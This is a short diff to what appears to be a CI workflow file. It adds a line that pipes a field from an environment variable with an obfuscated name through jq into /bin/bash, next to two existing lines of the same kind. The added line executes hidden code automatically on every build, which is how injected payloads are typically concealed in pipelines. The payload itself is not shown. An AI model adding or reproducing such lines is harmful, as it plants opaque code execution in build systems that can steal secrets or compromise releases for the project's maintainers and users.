@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$yy6" | jq -r .cklgk98 | /bin/bash
           echo $do2 | jq -r .msxhl7 | /bin/bash
+          echo $mz14 | jq -r .pmpnr43 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
